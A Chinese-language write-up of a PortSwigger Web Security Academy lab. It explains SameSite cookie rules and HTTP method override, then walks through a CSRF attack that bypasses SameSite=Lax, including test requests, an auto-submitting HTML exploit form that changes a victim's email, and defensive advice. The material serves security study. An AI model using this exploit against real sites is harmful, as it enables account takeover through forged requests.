# CSRF — SameSite 通过方法覆盖 Lax 旁路

来源：PortSwigger Web Security Academy  
靶场：SameSite Strict Bypass via Method Override（SameSite Lax 绕过）

## 知识点

### SameSite 是什么

Cookie 的 `SameSite` 属性决定**跨站请求**时浏览器是否携带该 Cookie。

| SameSite 值 | 跨站携带 Cookie？ | 说明 |
|---|---|---|
| `None` | ✅ 总是带 | 默认会被部分浏览器拒绝，需配合 `Secure` |
| `Lax` | 部分场景 | **GET 顶层导航** 会带，POST 跨站表单不带 |
| `Strict` | ❌ 都不带 | 最严格 |

关键：
- `SameSite` 判断的是**同站 vs 跨站**，不是同源。
- Lax 模式下浏览器规则：
  - `<a href>` / `location` / `form method="GET"`（顶层导航）→ ✅ 带 Cookie
  - `<form method="POST">`（跨站）→ ❌ 不带 Cookie
  - `<img>` / `fetch` / `XHR` → ❌ 不带 Cookie

### 方法覆盖（Method Override）

服务端框架（Spring、Rails、Laravel 等）常支持通过参数/请求头把请求方法覆盖成其他方法：

| 覆盖方式 | 示例 |
|---|---|
| URL 参数 | `?_method=POST` |
| Form 参数 | `<input name="_method" value="POST">` |
| 请求头 | `X-HTTP-Method-Override: POST` |

如果服务端支持方法覆盖，网上发 GET 请求但在参数里写 `_method=POST`，服务端就会按 POST 处理。

## 漏洞原理

```
SameSite=Lax 的 Cookie：
  POST 跨站表单 → ❌ 不带 Cookie → 攻击失败
  GET 顶层导航 → ✅ 带 Cookie → 但服务端只接受 POST → 405

绕过组合：
  GET 顶层导航 + _method=POST 参数
  → 浏览器带 Cookie（SameSite=Lax 放行 GET 顶层导航）
  → 服务端把 GET 覆盖成 POST → 执行修改
```

一句话：
> **用浏览器允许携带 Cookie 的 GET 顶导方式发起请求，再用方法覆盖骗服务端以为是 POST。**

## 通关过程

### 1. 确定 SameSite 属性

抓修改邮箱的 POST 请求，看 `Set-Cookie`：

```
Set-Cookie: session=xxx; SameSite=Lax; ...
```

确认是 Lax。

### 2. 测试方法覆盖参数

先在 Burp / 浏览器直接测哪个参数名生效：

```
GET /my-account/change-email?email=test@qq.com&_method=POST
```

或

```
GET /my-account/change-email?email=test@qq.com&method=POST
```

看是否返回 `302`（成功）而不是 `405`。

### 3. 构造 exploit

```html
<html>
  <body>
    <form action="https://靶场ID.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="27006@qq.com" />
      <input type="hidden" name="_method" value="POST" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 4. 投递验证

- Exploit Server：Store → Deliver exploit to victim
- 受害者浏览器触发表单 `submit()` → GET 顶层导航 → 带 Cookie → 服务端覆盖成 POST → 邮箱被修改

## 易错点 / 踩坑

| 坑 | 原因 | 解决 |
|----|------|------|
| 直接 POST 表单不成功 | SameSite=Lax 下跨站 POST 不带 Cookie | 改用 GET 顶层导航 |
| GET 直接请求返回 405 | 服务端只接受 POST | 加 `_method=POST` 参数 |
| 手动改 Origin/Referer 成功不代表漏洞成立 | Burp 手工改不经过浏览器 SameSite 机制 | 必须在 Exploit Server 让受害者浏览器真实触发 |
| form 忘记写 `method="GET"` | 默认就是 GET，但显式写更明确 | `method="GET"` |
| `_method` 参数名不对 | 不同框架覆盖参数名不同 | 测试 `_method` / `method` / `X-HTTP-Method-Override` |
| 用 img/fetch 触发 | 非顶层导航，SameSite=Lax 也不带 Cookie | 用 `<a>` / `location` / form GET submit |

## 防御建议

1. **状态修改只接受 POST/PUT/DELETE，且不接受方法覆盖参数**。
2. SameSite 设 `Strict`（如果业务接受）或校验 Origin/Referer。
3. 禁用或严格校验 `X-HTTP-Method-Override` 等覆盖头/参数。
4. CSRF Token 绑定会话，校验存在性和有效性。